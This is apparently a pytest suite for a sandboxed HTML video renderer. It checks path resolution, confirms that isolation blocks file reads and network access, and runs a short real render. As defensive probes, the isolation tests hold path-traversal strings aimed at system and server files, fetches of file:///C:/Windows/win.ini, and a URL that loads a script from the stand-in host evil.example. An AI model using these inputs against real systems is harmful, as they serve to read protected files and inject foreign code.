"""The renderer's isolation (virtual origin, no file:// access, no network) and one real 2 s render (slow, opt-in)."""
import asyncio
import json
import subprocess
import sys
from pathlib import Path

import pytest

from conftest import VIDEO

sys.path.insert(0, str(VIDEO / "html"))
import render as R  # noqa: E402


def test_mounts_map_and_resolve(tmp_path):
    m = R.Mounts()
    assert m.add(R.HERE) == "/html"
    (tmp_path / "assets").mkdir()
    (tmp_path / "assets" / "shot.png").write_bytes(b"x")
    (tmp_path / "secret.txt").write_text("no")
    tl = {"asset_base": (tmp_path / "assets").as_uri() + "/", "presenter": {"video_url": (tmp_path / "assets" / "shot.png").as_uri()},
          "keep": "https://example.com/x", "n": [1, {"deep": (tmp_path / "assets").as_uri() + "/"}]}
    out = m.rewrite(tl)
    assert out["asset_base"].startswith(R.VIRT + "/_ext") and out["asset_base"].endswith("/")
    assert out["presenter"]["video_url"] == out["asset_base"] + "shot.png"
    assert out["keep"] == "https://example.com/x" and out["n"][1]["deep"] == out["asset_base"]
    base = out["asset_base"][len(R.VIRT):]
    assert m.resolve(base + "shot.png") == (tmp_path / "assets" / "shot.png").resolve()
    for bad in (base + "../secret.txt", base + "..%2Fsecret.txt", base + "..\\secret.txt", base + "C:/Windows/win.ini",
                base, "/html/../studio/server.py", "/studio/server.py", "/html/" + "%2e%2e/studio/server.py"):
        assert m.resolve(bad) is None, bad
    assert m.resolve("/html/index.html") == (R.HERE / "index.html").resolve()


@pytest.mark.slow
def test_template_code_cannot_read_files_or_reach_the_network():
    async def probe():
        from playwright.async_api import async_playwright
        m = R.Mounts()
        m.add(R.HERE)
        m.add(R.VIDEO / "shared" / "fonts")
        async with async_playwright() as p:
            browser, ctx = await R.open_context(p, 320, 240, m)
            page = await ctx.new_page()
            await page.goto(R.VIRT + "/html/index.html?embed")
            res = await page.evaluate("""async () => {
              const out = {};
              for (const [k, u] of Object.entries({file: 'file:///C:/Windows/win.ini', up: '/html/../studio/server.py',
                   net: 'https://example.com/', studio: 'http://127.0.0.1:8001/api/projects', ok: '/html/style.css'})) {
                try { const r = await fetch(u); out[k] = r.status; } catch (e) { out[k] = 'blocked'; }
              }
              return out; }""")
            # ?data= must never load another site's script into the renderer page
            n = len(m.blocked)
            await page.goto(R.VIRT + "/html/index.html?render&data=https://evil.example/x.js")
            await page.wait_for_timeout(500)
            data_attempts = [u for u in m.blocked[n:] if "evil.example" in u]
            await browser.close()
            return res, m.blocked, data_attempts
    res, blocked, data_attempts = asyncio.run(probe())
    assert res == {"file": "blocked", "up": 404, "net": "blocked", "studio": "blocked", "ok": 200}
    assert any("example.com" in u for u in blocked)
    assert data_attempts == []


@pytest.mark.slow
def test_real_render_two_second_still(client, example_project, tmp_path):
    import build
    from store import Project, probe
    p = Project.get(example_project["id"])
    tl = build.write_render_timeline(p, "en", "9:16")
    f = p.build_dir / tl["_file"]
    t = json.loads(f.read_text(encoding="utf-8"))
    t.update(duration=2.0, frames=60, scenes=t["scenes"][:1], captions=t["captions"][:1])
    t["scenes"][0].update(start=0.0, end=2.0)
    t["audio"] = None
    f.write_text(json.dumps(t), encoding="utf-8")
    out, cover = tmp_path / "still.mp4", tmp_path / "cover.png"
    r = subprocess.run([sys.executable, str(R.HERE / "render.py"), "--project", str(p.dir), "--timeline", str(f),
                        "--out", str(out), "--workers", "2", "--cover", "1", "--cover-out", str(cover)],
                       capture_output=True, text=True, timeout=240)
    assert r.returncode == 0, r.stdout[-800:] + r.stderr[-800:]
    info = probe(out)
    assert abs(info["duration"] - 2.0) < 0.15 and (info["w"], info["h"]) == (1080, 1920)
    assert cover.stat().st_size > 10_000
    assert "blocked" not in r.stderr
